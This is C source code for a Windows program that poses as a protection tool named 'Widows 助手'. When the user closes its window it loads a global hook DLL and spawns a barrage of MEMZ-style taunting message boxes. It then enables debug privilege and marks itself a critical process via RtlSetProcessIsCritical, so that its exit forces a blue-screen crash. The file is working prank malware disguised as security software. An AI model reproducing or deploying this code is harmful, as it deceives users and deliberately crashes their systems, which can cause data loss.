#define _WIN32_WINNT 0x602
#include <windows.h>
#include <stdio.h>
#include <dwmapi.h>
#include <uxtheme.h>
#include "rsrc.h"



void DrawGlowingText(HDC hDC, LPWSTR szText, RECT *rcArea, 
	DWORD dwTextFlags, int iGlowSize, HFONT hFont)
{
	//获取主题句柄
	HTHEME hThm = OpenThemeData(GetDesktopWindow(), L"TextStyle");
	//创建DIB
	HDC hMemDC = CreateCompatibleDC(hDC);
	BITMAPINFO bmpinfo = {0};
	bmpinfo.bmiHeader.biSize = sizeof(bmpinfo.bmiHeader);
	bmpinfo.bmiHeader.biBitCount = 32;
	bmpinfo.bmiHeader.biCompression = BI_RGB;
	bmpinfo.bmiHeader.biPlanes = 1;
	bmpinfo.bmiHeader.biWidth = rcArea->right - rcArea->left;
	bmpinfo.bmiHeader.biHeight = -(rcArea->bottom - rcArea->top);
	HBITMAP hBmp = CreateDIBSection(hMemDC, &bmpinfo, DIB_RGB_COLORS, 0, NULL, 0);
	if (hBmp == NULL) return;
	HGDIOBJ hBmpOld = SelectObject(hMemDC, hBmp);
	//绘制选项
	DTTOPTS dttopts = {0};
	dttopts.dwSize = sizeof(DTTOPTS);
	dttopts.dwFlags = DTT_GLOWSIZE | DTT_COMPOSITED;
	dttopts.iGlowSize = iGlowSize;	//发光的范围大小
	//绘制文本
	SetTextColor(hMemDC, RGB(192, 0, 255));
	if(hFont) SelectObject(hMemDC, hFont);
	RECT rc = {0, 0, rcArea->right - rcArea->left, rcArea->bottom - rcArea->top};
	HRESULT hr = DrawThemeTextEx(hThm, hMemDC, 0, 0, szText, -1, dwTextFlags , &rc, &dttopts);
	if(FAILED(hr)) return;
	BitBlt(hDC, rcArea->left, rcArea->top, rcArea->right - rcArea->left, 
		rcArea->bottom - rcArea->top, hMemDC, 0, 0, SRCCOPY | CAPTUREBLT);
	//Clear
	SelectObject(hMemDC, hBmpOld);
	DeleteObject(hBmp);
	DeleteDC(hMemDC);
	CloseThemeData(hThm);
}

LPCWSTR lpYesBtn;
LPCWSTR lpNoBtn;
LRESULT CALLBACK messageBoxHookButton(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode < 0)
		return CallNextHookEx(0, nCode, wParam, lParam);
	
	LPCWPRETSTRUCT msg = (LPCWPRETSTRUCT)lParam;
	if (msg->message == WM_INITDIALOG) {
		HWND btn = GetDlgItem(msg->hwnd, IDYES);
		SetWindowTextW(btn, lpYesBtn);
		btn = GetDlgItem(msg->hwnd, IDNO);
		SetWindowTextW(btn, lpNoBtn);
	}
	
	return CallNextHookEx(0, nCode, wParam, lParam);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT Message, WPARAM wParam, LPARAM lParam) {
	switch(Message) {
		
		case WM_CLOSE: {
			
			HHOOK hook = SetWindowsHookEx(WH_CALLWNDPROCRET, messageBoxHookButton, 0, GetCurrentThreadId());
			lpNoBtn = L"残忍退出";
			lpYesBtn = L"坚持防护";
			if(IDNO == MessageBoxW(hwnd, L"你确定要退出吗？\n退出后将会导致电脑失去防护！", L"Widows 助手", MB_ICONWARNING|MB_YESNO)){
				UnhookWindowsHookEx(hook);
				lpNoBtn = L"再想想";
				lpYesBtn = L"我确定";
				hook = SetWindowsHookEx(WH_CALLWNDPROCRET, messageBoxHookButton, 0, GetCurrentThreadId());
				if(IDYES == MessageBoxW(hwnd, L"你真的要退出吗？！我可已经拦截了1919810个危险程序！", L"Widows 助手", MB_ICONERROR|MB_YESNO)){
					DestroyWindow(hwnd);
					UnhookWindowsHookEx(hook);
				}
					
			} 
			break;
		}
		case WM_ACTIVATE: {
			SetLayeredWindowAttributes(hwnd, 0, 255, LWA_ALPHA);
			MARGINS margins = {-1, -1, -1, -1};
			DwmExtendFrameIntoClientArea(hwnd, &margins);
			break;
		}
		
		
		case WM_PAINT:{
			InvalidateRect(hwnd, NULL, FALSE);
			PAINTSTRUCT ps;
			HDC hdc = BeginPaint(hwnd, &ps);
			RECT rc;
			GetClientRect(hwnd, &rc);
			LOGFONTW LogFont = {0 };
			LogFont.lfHeight = -48;
			LogFont.lfWeight = FW_BOLD;
			LogFont.lfWidth = -22;
			LogFont.lfUnderline = TRUE;
			lstrcpyW(LogFont.lfFaceName, L"微软雅黑");
			HFONT hFontNew = CreateFontIndirectW(&LogFont);
			SelectObject(hdc, hFontNew);
			
			
			DrawGlowingText(hdc, L"Widows 助手正在保护你的电脑。", &rc, DT_CENTER, 15, hFontNew);
			
			
			rc.top += 100;
			LogFont.lfWidth = -18;
			LogFont.lfWeight = FW_SEMIBOLD;
			LogFont.lfUnderline = FALSE;
			HFONT hFontNew2 = CreateFontIndirectW(&LogFont);
			SelectObject(hdc, hFontNew2);
			DrawGlowingText(hdc, L"该电脑自豪的成为助手保护的\n第 114514 台电脑。", &rc, DT_CENTER, 10, hFontNew2);
			rc.top += 120;
			LogFont.lfWidth = -16;
			LogFont.lfWeight = FW_SEMIBOLD;
			LogFont.lfUnderline = FALSE;
			HFONT hFontNew3 = CreateFontIndirectW(&LogFont);
			SelectObject(hdc, hFontNew3);
			DrawGlowingText(hdc, L"程序作者:b站@旮沓曼_gt428", &rc, DT_CENTER, 10, hFontNew3);
			DrawIconEx(hdc, 315, 300, LoadImageA(GetModuleHandleA(NULL), MAKEINTRESOURCEA(ICON_GT428), IMAGE_ICON, 0, 0, LR_LOADMAP3DCOLORS), 128, 128, 0, 0, DI_NORMAL);			
			EndPaint(hwnd, &ps);
			break;
		}
		case WM_DESTROY: {
			PostQuitMessage(0);
			break;
		}
		default:
			return DefWindowProc(hwnd, Message, wParam, lParam);
	}
	return 0;
}

DWORD WINAPI CreateTerminater(LPVOID lpParameter) {
	HINSTANCE hInstance = GetModuleHandle(NULL);
	WNDCLASSEX wc;
	HWND hwnd;
	MSG Msg;

	memset(&wc,0,sizeof(wc));
	wc.cbSize		 = sizeof(WNDCLASSEX);
	wc.lpfnWndProc	 = WndProc; /* insert window procedure function here */
	wc.hInstance	 = hInstance;
	wc.hCursor		 = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = CreateSolidBrush(RGB(255,165,0));
	wc.lpszClassName = "WindowClass";
	wc.hIcon		 = LoadIcon(hInstance, MAKEINTRESOURCE(ICON_HELPER)); /* use "A" as icon name when you want to use the project icon */
	wc.hIconSm		 = LoadIcon(hInstance, MAKEINTRESOURCE(ICON_HELPER)); /* as above */

	if(!RegisterClassEx(&wc)) {
		MessageBoxA(NULL, "Window Registration Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
		return 0;
	}

	
	hwnd = CreateWindowExA(WS_EX_CLIENTEDGE|WS_EX_OVERLAPPEDWINDOW|WS_EX_LAYERED,"WindowClass","Widows 助手",WS_VISIBLE|WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_THICKFRAME,CW_USEDEFAULT,CW_USEDEFAULT,800,480,NULL,NULL,hInstance,NULL);
	if(hwnd == NULL) {
		MessageBoxA(NULL, "Window Creation Failed!","Error!",MB_ICONEXCLAMATION|MB_OK);
		return 0;
	}
	while(GetMessage(&Msg, NULL, 0, 0) > 0) {
		TranslateMessage(&Msg);
		DispatchMessage(&Msg);	
	}
	return 0; 
}


const char *msgs[] = {
	"YOU KILLED MY TROJAN!\r\nNow you are going to die.",
	"REST IN PISS, FOREVER MISS.",
	"I WARNED YOU...",
	"HAHA N00B L2P G3T R3KT",
	"You failed at your 1337 h4x0r skillz.",
	"YOU TRIED SO HARD AND GOT SO FAR, BUT IN THE END, YOUR PC WAS STILL FUCKED!",
	"HACKER!\r\nENJOY BAN!",
	"GET BETTER HAX NEXT TIME xD",
	"HAVE FUN TRYING TO RESTORE YOUR DATA :D",
	"|\\/|3|\\/|2",
	"BSOD INCOMING",
	"VIRUS PRANK (GONE WRONG)",
	"ENJOY THE NYAN CAT",
	"Get dank antivirus m9!",
	"You are an idiot!\r\nHA HA HA HA HA HA HA",
	"#MakeMalwareGreatAgain",
	"SOMEBODY ONCE TOLD ME THE MEMZ ARE GONNA ROLL ME",
	"Why did you even tried to kill MEMZ?\r\nYour PC is fucked anyway.",
	"SecureBoot sucks.",
	"gr8 m8 i r8 8/8",
	"Have you tried turning it off and on again?",
	"<Insert Joel quote here>",
	"Greetings to all GAiA members!",
	"Well, hello there. I don't believe we've been properly introduced. I'm Bonzi!",
	"'This is everything I want in my computer'\r\n - danooct1 2016",
	"'Uh, Club Penguin. Time to get banned!'\r\n - danooct1 2016",
};

const size_t nMsgs = sizeof(msgs) / sizeof(void *);



BOOL WINAPI SetPrivilege(LPCSTR lpPrivilegeName, WINBOOL fEnable){
	HANDLE hToken; 
	TOKEN_PRIVILEGES NewState; 
	LUID luidPrivilegeLUID; 
	if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return FALSE;
	
	if(!fEnable)
	{
		if(!AdjustTokenPrivileges(hToken, TRUE, NULL, 0, NULL, NULL)) return FALSE;
		else return TRUE;
	}
	LookupPrivilegeValue(NULL, lpPrivilegeName, &luidPrivilegeLUID);
	
	NewState.PrivilegeCount = 1; 
	NewState.Privileges[0].Luid = luidPrivilegeLUID; 
	NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
	
	if(!AdjustTokenPrivileges(hToken, FALSE, &NewState, 0, NULL, NULL)) return FALSE;
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) return FALSE;
	return TRUE;
}

typedef enum _HARDERROR_RESPONSE_OPTION {
    OptionAbortRetryIgnore,
    OptionOk,
    OptionOkCancel,
    OptionRetryCancel,
    OptionYesNo,
    OptionYesNoCancel,
    OptionShutdownSystem,
    OptionOkNoWait,
    OptionCancelTryContinue
} HARDERROR_RESPONSE_OPTION;


typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWCH   Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef LONG (WINAPI *type_NtRaiseHardError)(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, HARDERROR_RESPONSE_OPTION ValidResponseOptions, PULONG Response);
typedef LONG (WINAPI *type_RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR); 


void KillInstant()
{
	HMODULE hDll = GetModuleHandle("ntdll.dll");
    typedef VOID (WINAPI * type_RtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
		type_RtlSetProcessIsCritical RtlSetProcessIsCritical = 
		(type_RtlSetProcessIsCritical)GetProcAddress(hDll, "RtlSetProcessIsCritical");
		
		BOOL bSuccess = SetPrivilege(SE_DEBUG_NAME, TRUE);//提升DEBUG权限。没有权限喝不了蓝屏钙
		if(!bSuccess) { 
			return ;
		} 
		Sleep(5000);
		/* 设为关键进程，即退出时蓝屏钙*/
		RtlSetProcessIsCritical(TRUE, NULL, FALSE);
    return ;
}


HCRYPTPROV prov;

int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
	return out & 0x7fffffff;
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		int scrw = GetSystemMetrics(SM_CXSCREEN), scrh = GetSystemMetrics(SM_CYSCREEN);
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (scrw - pcs->cx);
			int y = random() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD WINAPI ripMessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxA(NULL, (LPCSTR)msgs[random() % nMsgs], "Widows 助手", MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
	UnhookWindowsHookEx(hook);

	return 0;
}
void Kill(){
	int i;
	for(i = 0; i < 20; i++){
		CreateThread(NULL, 4096, ripMessageThread, NULL, 0, 0);
		Sleep(20);
	}
	KillInstant();
}

int main(){
	SetPrivilege(SE_DEBUG_NAME, TRUE);
	typedef VOID (WINAPI *MYFUNC)(void);
	
	HMODULE SpyDll = LoadLibraryA("gt428_detours_x86.dll");
	if(SpyDll == NULL){
		MessageBoxW(NULL, L"错误:无法加载库 gt428_detours_x86.dll，请确保该文件在同目录或 Windows 目录下", L"错误", MB_ICONERROR);
		return 1;
	}
	MYFUNC EnableGlobalHook = (MYFUNC)GetProcAddress(SpyDll, "EnableGlobalHook");
	MYFUNC DisableGlobalHook = (MYFUNC)GetProcAddress(SpyDll, "DisableGlobalHook");
	EnableGlobalHook();
	CreateTerminater(0);
	DisableGlobalHook();
	Sleep(5000);
	Kill(); 
	
	
} 
